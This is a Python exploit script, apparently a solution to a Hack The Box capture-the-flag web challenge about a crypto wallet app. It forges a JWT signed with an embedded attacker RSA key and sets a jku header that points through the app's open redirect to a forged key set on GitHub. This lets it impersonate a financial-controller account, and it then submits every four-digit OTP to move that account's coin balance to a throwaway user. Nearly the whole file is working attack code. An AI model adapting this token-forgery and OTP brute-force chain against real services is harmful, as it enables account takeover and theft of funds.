import requests, datetime, os, base64, json, rsa
from jwcrypto import jwk, jwt
from jwcrypto.common import json_decode

HOST = 'http://83.136.254.250:33063/'
#HOST = "http://localhost:3000"
FINANCIAL_EMAIL = 'financial-controller@frontier-board.htb'
COIN_SYMBOL = 'CLCR'

def create_forged_jwt(jku_url, kid, priv_key, payload):
    key = jwk.JWK.generate(kty='RSA', size=2048)

    # Extract the private key for signing
    json_str = """
    {
        "p": "07yJBqN2k87kaCHIrBjsgUelnA7QzGlAUxtXua4Kmb5RWrKxmIE1rdyx9y6RBMM8QkbFEQsqLiICD6-58VNjMALoNzB5dsm3JRiOmpqle1CbbBXyged4hFEVBMvUML2pM3B7pE6Frx1h1uNMeF7yj0z5JsZAOl7oFZC3Mifdi1U",
        "kty": "RSA",
        "q": "0rOQMSupxkTduYSIsYGZ-vzyGrbnyQp_vWHnEhkS6w1quOGD3VtNJmMiI5h8jEJ_c-y-LUfyT85hmvL7IgZzu2N28BvEiGt-ahsqJkwZHb8KwSX7qP61Fz3x8If4NKhHkvreodwxEoWv0Xb7l8ojmzn06s0RtoSf1qFMHbe0sAk",
        "d": "ccXTcENipe58wQTf3ozrofZB_Tparvx4m6oN05kGTVfZm2lCIvmiMfUTYIQBP-IXMbDrpI1g5nSp4ZmP4dBoACdXMwMNT_8EbbZv7MDS9zpfnhXGrzz-2ZMUBbVkfFJ2FUtzCRYtLXBlznesblgg65HVaKJww-bJEB2_YPHsgnflunY1Xtr-tVS1AdtqWReIpF3DXyWtOENFaHHfI0AECAJK6YLgJPyPnaoFkc4hxA1t31UOm82T3SZUuq9y18DNOzUrgQTi1iflwaKas59Z0euaTdShDJ00H_veI3DKEJ5idCr1shCz4vn30hLYYZBNGB1mZL3AgCM9c1f2rmzpQQ",
        "e": "AQAB",
        "use": "sig",
        "kid": "351c849f-1202-49a8-b53e-c9e07321bd5f",
        "qi": "CjKWWsLNbf6Kguwqst3IMCHm_aWje3NQS-RxLsgfnuFB1RnbU_RcYbMlYi6Jrq-0lSgdN_tF2ykC7HG-diEP-ldzrfFL0-I6Erjpf63m47qp8ywxTMP5E__IUCVIbM9VOB0FBVJCufyQMit99TyEHuhAlAvAadSP_cefOJn9drc",
        "dp": "GItZYwCd5UJtbbjE11ZITDAu_WkmQRvOThP0Vlzbc7kBGz9toN0RiOb1Zk7qlp-_I3uqqnAd4p0kmgbnyha9f7pGiuc-nUuCxHUVSsy0dBgC_EOLCg34BXaUtiqenUvPClx2qLRFgOgqCEvu-GEhQwVMOHdwyJNp2d4drl26q8U",
        "alg": "RS256",
        "dq": "bo-EiRilRIGcax2NcL9V4irai4QQiiC1ONXnn0qC784hgxPq0rt29z6rikwYhqzaHiVLAY2wK4pbEyiO-KK0Fc8yePnJHeBx_BF3A5OI1mAJr6JTtLC6q5B4pMNkTZVDwW9cZUiag2KdCGfLyzFpj6lQx-iFc-WRzdjjjPB5oqk",
        "n": "rkUsffoCndhoJ1sPA7nv4uihCuEvhvEHBnEj-CShAwpYQr4V7JCibmYbPs8B8yr9f2iJHw8rl9QoGfbLbWNF8p4S8fPqbjzXI393HzmkHwyYBorEvGAOTaygc7NtZXU6ABS6XrXbYU8tkt_EfZSDIKAR9u2wB5uniW2xtQaHzG7hvwR0f2tkMNuApLRzImqjQRnQANR638ZqqtVeTX6QINezZArSU3BL6n43WkNy_91lpaeuYmfX3CGTHY6KYJMWT9pjnDqS2F2D3e-P74c8xVhxhhGO0K0B_MKeQTU-bn_RQ6sJD1Y768npPEX-4h3_BO2zY0NryM7ht1cscVhV_Q"
    }
    """
    private_key = jwk.JWK.from_json(json_str)

    # Header definition
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": kid,
        "jku": jku_url
    }

    # Payload definition
    payload = {
        "email": "financial-controller@frontier-board.htb",
        "iat": 1734099731  # Specific issued-at time
    }


    # Create the JWT token
    token = jwt.JWT(header=json.dumps(header), claims=json.dumps(payload))

    print("Token (before serialization):")
    print({"header": header, "payload": payload})

    token.make_signed_token(private_key)

    serialized = token.serialize()
    return serialized


def validate_token(token):
    response = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {forged_token}'})
    if response.status_code == 200:
        print('[+] JWT validation successful! Response:')
        print(response.json())
    else:
        print(f'[!] JWT validation failed. Status: {response.status_code}, Response: {response.text}')

payload = {
    'email': FINANCIAL_EMAIL,
    'iat': datetime.datetime.utcnow(),
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=0, hours=6, seconds=0)
}


def register_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/register', 
        json=user
    )
    if r.status_code == 200:
        print(f'User registered successfully: {email}')
    else:
        print(f'Failed to register user: {email}, Response: {r.text}')

def login_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/login', 
        json=user
    )
    if r.status_code == 200:
        data = r.json()
        token = data['token']
        print(f'Login successful for: {email}, Token: {token}')
        return token
    else:
        print(f'Login failed for: {email}, Response: {r.text}')
        return None

def send_friend_request(token, to_email):
    r = requests.post(
        f'{HOST}/api/users/friend-request',
        json={'to': to_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request sent to: {to_email}')
    else:
        print(f'Failed to send friend request to {to_email}: {r.text}')

def fetch_friend_requests(token):
    r = requests.get(
        f'{HOST}/api/users/friend-requests',
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        requests_data = r.json()
        print('Pending friend requests:', requests_data.get('requests', []))
    else:
        print(f'Failed to fetch friend requests: {r.status_code} {r.text}')

def accept_friend_request(token, from_email):
    r = requests.post(
        f'{HOST}/api/users/accept-friend',
        json={'from': from_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request from {from_email} accepted.')
    else:
        print(f'Failed to accept friend request from {from_email}: {r.text}')

def fetch_balance(token):
    r = requests.get(
        f'{HOST}/api/crypto/balance', 
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        balances = r.json()
        for coin in balances:
            if coin['symbol'] == COIN_SYMBOL:
                print(f'Balance for {COIN_SYMBOL}: {coin["availableBalance"]}')
                return coin['availableBalance']
        else:
            print(f'Failed to fetch balances: {r.text}')
    return 0

def make_transaction(token, to_email, coin, amount, otp):
    '''（ミ￣ー￣ミ）'''
    r = requests.post(
        f'{HOST}/api/crypto/transaction',
        json={'to': to_email, 'coin': coin, 'amount': amount, 'otp': otp},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Transaction of {amount} {coin} to {to_email} completed successfully.')
    else:
        print(f'Failed to make transaction to {to_email}: {r.text}')

def fetch_flag(token):
    r = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200:
        data = r.json()
        if 'flag' in data:
            print(f'Flag: {data["flag"]}')
        else:
            print('Flag not found in the response.')
    else:
        print(f'Failed to fetch dashboard: {r.text}')

def fetch_gist_forged_jwk(url):
    r = requests.get(url)
    if r.status_code == 200:
        return r.json()
    else:
        print(f'Failed to fetch forged JWK: {r.text}')
        return None

forged_jwks_url = "https://raw.githubusercontent.com/juliankrieger/htb2024/refs/heads/master/forged-jwks"

dummy_user = {'email': f'{os.urandom(10).hex()}@htb.com', 'password': '1337'}

register_user(dummy_user['email'], dummy_user['password'])

dummy_token = login_user(dummy_user['email'], dummy_user['password'])

print(f'[~] Dummy token: {dummy_token}')

decoded_token = jwt.JWT(jwt=dummy_token)
print(f'[~] Decoded token: {decoded_token}')

# Get the header
header = decoded_token.token.jose_header

dummy_user_kid = header['kid']

print(f'[~] Current active Server KID: {dummy_user_kid}')

gist = fetch_gist_forged_jwk(forged_jwks_url)
kid = gist["keys"][0]["kid"]

print(f'[~] Forged JWK KID: {kid}')
if kid != dummy_user_kid:
    print(f'[!] Forged JWK KID does not match the current active server kid, you need to update!: {kid} != {dummy_user_kid}')
    exit(1)


jku_url = "http://127.0.0.1:1337/api/analytics/redirect?url=https://raw.githubusercontent.com/juliankrieger/htb2024/refs/heads/master/forged-jwks&ref=aaa"
priv_key = ""
payload = ""

forged_token = create_forged_jwt(jku_url, kid, priv_key, payload)
print(f'[~] Forged JWT: {forged_token}')

print('[+] Validating forged JWT against /api/dashboard...')
validate_token(forged_token)


if dummy_token:
    send_friend_request(dummy_token, FINANCIAL_EMAIL)

financial_token = forged_token

if financial_token:
    fetch_friend_requests(financial_token)
    accept_friend_request(financial_token, dummy_user['email'])

otps = [f"{i:04}" for i in range(10000)]


if financial_token and dummy_token:
    cluster_credit_balance = fetch_balance(financial_token)
    if cluster_credit_balance > 0:
        make_transaction(financial_token, dummy_user['email'], COIN_SYMBOL, cluster_credit_balance, otps)

    fetch_flag(financial_token)
    
# ocd
